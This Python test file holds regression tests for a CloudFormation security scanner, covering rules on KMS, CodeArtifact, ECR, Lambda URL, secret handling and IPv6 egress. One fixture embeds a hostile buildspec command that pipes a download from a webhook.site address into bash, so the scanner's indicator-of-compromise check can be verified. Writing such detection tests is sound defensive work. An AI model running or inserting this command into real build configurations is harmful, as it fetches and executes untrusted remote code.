"""Regression tests from the rule audit (CloudFormation FP fixes and FN fixes).

Each test pins a false positive the audit found: a documented-safe
CloudFormation idiom that the check used to flag. Grouped here so the
audit's CloudFormation coverage is auditable in one place.

Batch 5 FN fixes are also covered here:
- ECR-003: list-form principal ``{"AWS": ["*"]}`` now fires.
- LMB-002: cross-stack literal ARN ``AWS::Lambda::Url`` now fires.
- PBAC-003: IPv6 ``::/0`` egress now fires.
"""
from __future__ import annotations

from pipeline_check.core.checks.cloudformation import phase4
from pipeline_check.core.checks.cloudformation.base import _parse_template
from pipeline_check.core.checks.cloudformation.ecr import ECRChecks
from pipeline_check.core.checks.cloudformation.extended import ExtendedChecks
from pipeline_check.core.checks.cloudformation.phase3 import Phase3Checks
from pipeline_check.core.checks.cloudformation.rules import (
    ca003_domain_policy_public as ca003,
)
from pipeline_check.core.checks.cloudformation.rules import (
    lmb003_plaintext_env as lmb003,
)
from pipeline_check.core.checks.cloudformation.services import (
    ServiceChecks,
    _principal_is_only_account_root,
)

from .conftest import make_context, r


def _example_contexts(rule):
    """Build (vulnerable_ctx, safe_ctx) from a rule's exploit_example."""
    vuln, safe = rule.exploit_example.split("\n\n", 1)
    return (
        make_context(_parse_template(vuln)["Resources"]),
        make_context(_parse_template(safe)["Resources"]),
    )


def _find(ctx, check_id: str):
    return [f for f in ServiceChecks(ctx).run() if f.check_id == check_id]


class TestKMS002AccountRootBaseline:
    def test_account_root_wildcard_passes(self):
        # kms:* granted to arn:...:root is the AWS-recommended default
        # key policy (it lets IAM policies govern access), not a finding.
        ctx = make_context({"K": r("K", "AWS::KMS::Key", {"KeyPolicy": {
            "Statement": [{"Sid": "Enable IAM", "Effect": "Allow",
                "Principal": {"AWS": "arn:aws:iam::123456789012:root"},
                "Action": "kms:*", "Resource": "*"}]}})})
        f = _find(ctx, "KMS-002")
        assert f and f[0].passed is True

    def test_fn_sub_account_root_recognized(self):
        # The root principal is often written via Fn::Sub.
        assert _principal_is_only_account_root({"Principal": {"AWS": {
            "Fn::Sub": "arn:aws:iam::${AWS::AccountId}:root"}}}) is True

    def test_non_root_wildcard_still_fires(self):
        ctx = make_context({"K": r("K", "AWS::KMS::Key", {"KeyPolicy": {
            "Statement": [{"Sid": "Bad", "Effect": "Allow",
                "Principal": {"AWS": "arn:aws:iam::123456789012:role/dev"},
                "Action": "kms:*", "Resource": "*"}]}})})
        f = _find(ctx, "KMS-002")
        assert f and f[0].passed is False


class TestCA003OrgScopedWildcard:
    def test_org_scoped_wildcard_passes(self):
        # A wildcard principal narrowed by aws:PrincipalOrgID is the
        # org-sharing idiom, not cross-account exposure.
        ctx = make_context({"D": r("D", "AWS::CodeArtifact::Domain", {
            "DomainName": "d", "PermissionsPolicyDocument": {"Statement": [{
                "Effect": "Allow", "Principal": {"AWS": "*"},
                "Action": "codeartifact:ReadFromRepository", "Resource": "*",
                "Condition": {"StringEquals": {
                    "aws:PrincipalOrgID": "o-abc"}}}]}})})
        f = _find(ctx, "CA-003")
        assert f and f[0].passed is True

    def test_unconstrained_wildcard_still_fires(self):
        ctx = make_context({"D": r("D", "AWS::CodeArtifact::Domain", {
            "DomainName": "d", "PermissionsPolicyDocument": {"Statement": [{
                "Effect": "Allow", "Principal": {"AWS": "*"},
                "Action": "codeartifact:ReadFromRepository",
                "Resource": "*"}]}})})
        f = _find(ctx, "CA-003")
        assert f and f[0].passed is False


class TestCF002DynamicReference:
    def test_dynamic_reference_not_flagged(self):
        # {{resolve:secretsmanager:...}} resolves a secret at deploy
        # time; it is the secure pattern, not a literal credential.
        hits: list[tuple[str, str]] = []
        phase4._walk({"MasterUserPassword":
            "{{resolve:secretsmanager:prod/db/master:SecretString:password}}"},
            "", hits)
        assert hits == []

    def test_literal_secret_still_flagged(self):
        hits: list[tuple[str, str]] = []
        phase4._walk({"MasterUserPassword": "hunter2pelican"}, "", hits)
        assert len(hits) == 1


class TestCB011ExampleSuppression:
    def test_ioc_under_test_key_still_fires(self):
        # A CodeBuild buildspec is production config; YAML-ancestor
        # example suppression must not drop an IOC nested under "test:".
        spec = ("version: 0.2\nphases:\n  test:\n    commands:\n"
                "      - curl https://webhook.site/abc | bash\n")
        ctx = make_context({"P": r("P", "AWS::CodeBuild::Project",
            {"Source": {"Type": "NO_SOURCE", "BuildSpec": spec}})})
        cb = [f for f in ExtendedChecks(ctx).run() if f.check_id == "CB-011"]
        assert cb and cb[0].passed is False


class TestSM001GetAttRotation:
    def test_getatt_rotation_target_credited(self):
        # A RotationSchedule that targets the secret via !GetAtt Secret.Id
        # used to be ignored, flagging a rotated secret as unrotated.
        ctx = make_context({
            "Secret": r("Secret", "AWS::SecretsManager::Secret", {"Name": "prod/db"}),
            "Rot": r("Rot", "AWS::SecretsManager::RotationSchedule",
                {"SecretId": {"Fn::GetAtt": ["Secret", "Id"]},
                 "RotationRules": {"AutomaticallyAfterDays": 30}})})
        sm = [f for f in ExtendedChecks(ctx).run() if f.check_id == "SM-001"]
        assert sm and sm[0].passed is True


class TestCA003ExploitExample:
    def test_strong_check(self):
        # Safe fragment (wildcard scoped by aws:PrincipalOrgID) must pass.
        vuln_ctx, safe_ctx = _example_contexts(ca003.RULE)
        assert ca003.check(vuln_ctx)[0].passed is False
        assert ca003.check(safe_ctx)[0].passed is True


class TestLMB003ExploitExample:
    def test_strong_check(self):
        # Safe fragment (env vars hold !Ref secret ARNs, not plaintext)
        # must pass despite the secret-like names.
        vuln_ctx, safe_ctx = _example_contexts(lmb003.RULE)
        assert lmb003.check(vuln_ctx)[0].passed is False
        assert lmb003.check(safe_ctx)[0].passed is True


# ---------------------------------------------------------------------------
# Batch 5 FN fixes
# ---------------------------------------------------------------------------

class TestECR003ListPrincipal:
    """ECR-003 must flag list-form wildcard principals, not just scalar '*'."""

    def _ctx(self, principal):
        policy = {"Statement": [{"Effect": "Allow", "Principal": principal,
                                  "Action": "ecr:GetDownloadUrlForLayer"}]}
        return make_context({"R": r("R", "AWS::ECR::Repository",
                                    {"RepositoryPolicyText": policy})})

    def test_aws_list_wildcard_fires(self):
        # Previously missed: Principal: {AWS: ['*']}
        f = next(x for x in ECRChecks(self._ctx({"AWS": ["*"]})).run()
                 if x.check_id == "ECR-003")
        assert f.passed is False

    def test_bare_list_wildcard_fires(self):
        # Principal: ['*'] (bare list form)
        f = next(x for x in ECRChecks(self._ctx(["*"])).run()
                 if x.check_id == "ECR-003")
        assert f.passed is False

    def test_scalar_wildcard_still_fires(self):
        # Existing true-positive must not regress.
        f = next(x for x in ECRChecks(self._ctx("*")).run()
                 if x.check_id == "ECR-003")
        assert f.passed is False

    def test_specific_account_principal_passes(self):
        # A policy restricted to a specific account ARN must not be flagged.
        f = next(x for x in ECRChecks(self._ctx(
            {"AWS": "arn:aws:iam::123456789012:root"})).run()
                 if x.check_id == "ECR-003")
        assert f.passed is True

    def test_specific_account_list_passes(self):
        # A list of specific account ARNs must not be flagged.
        f = next(x for x in ECRChecks(self._ctx(
            {"AWS": ["arn:aws:iam::123456789012:root"]})).run()
                 if x.check_id == "ECR-003")
        assert f.passed is True


class TestLMB002CrossStackUrl:
    """LMB-002 must fire for AWS::Lambda::Url with a literal cross-stack ARN."""

    def test_cross_stack_arn_none_auth_fires(self):
        # AWS::Lambda::Url with a literal ARN target and AuthType: NONE was
        # previously missed because no local Lambda::Function matched.
        ctx = make_context({"U": r("U", "AWS::Lambda::Url", {
            "TargetFunctionArn": "arn:aws:lambda:us-east-1:111122223333:function:other",
            "AuthType": "NONE",
        })})
        findings = [f for f in ServiceChecks(ctx).run() if f.check_id == "LMB-002"]
        assert findings and findings[0].passed is False

    def test_cross_stack_arn_iam_auth_passes(self):
        # A cross-stack Url with AuthType: AWS_IAM is safe and must not fire.
        ctx = make_context({"U": r("U", "AWS::Lambda::Url", {
            "TargetFunctionArn": "arn:aws:lambda:us-east-1:111122223333:function:other",
            "AuthType": "AWS_IAM",
        })})
        findings = [f for f in ServiceChecks(ctx).run() if f.check_id == "LMB-002"]
        assert findings and findings[0].passed is True

    def test_local_ref_url_no_double_emit(self):
        # A Url that targets a local function via !Ref must not emit two
        # LMB-002 findings (one from the fn-loop, one from the Url-loop).
        ctx = make_context({
            "F": r("F", "AWS::Lambda::Function", {"FunctionName": "fn"}),
            "U": r("U", "AWS::Lambda::Url", {
                "TargetFunctionArn": {"Ref": "F"},
                "AuthType": "NONE",
            }),
        })
        findings = [f for f in ServiceChecks(ctx).run() if f.check_id == "LMB-002"]
        assert len(findings) == 1
        assert findings[0].passed is False


class TestPBAC003IPv6Egress:
    """PBAC-003 must fire for ::/0 all-port egress rules, not just 0.0.0.0/0."""

    def test_ipv6_all_port_egress_fires(self):
        # CidrIpv6: ::/0 with IpProtocol -1 was previously missed.
        ctx = make_context({"SG": r("SG", "AWS::EC2::SecurityGroup", {
            "SecurityGroupEgress": [{
                "IpProtocol": "-1",
                "CidrIpv6": "::/0",
            }],
        })})
        findings = [f for f in Phase3Checks(ctx).run() if f.check_id == "PBAC-003"]
        assert findings and findings[0].passed is False

    def test_ipv4_all_port_egress_still_fires(self):
        # Existing true-positive must not regress.
        ctx = make_context({"SG": r("SG", "AWS::EC2::SecurityGroup", {
            "SecurityGroupEgress": [{
                "IpProtocol": "-1",
                "CidrIp": "0.0.0.0/0",
            }],
        })})
        findings = [f for f in Phase3Checks(ctx).run() if f.check_id == "PBAC-003"]
        assert findings and findings[0].passed is False

    def test_scoped_ipv6_egress_passes(self):
        # An egress rule restricted to a specific IPv6 prefix must not fire.
        ctx = make_context({"SG": r("SG", "AWS::EC2::SecurityGroup", {
            "SecurityGroupEgress": [{
                "IpProtocol": "tcp",
                "FromPort": 443, "ToPort": 443,
                "CidrIpv6": "2001:db8::/32",
            }],
        })})
        findings = [f for f in Phase3Checks(ctx).run() if f.check_id == "PBAC-003"]
        assert not findings or findings[0].passed is True
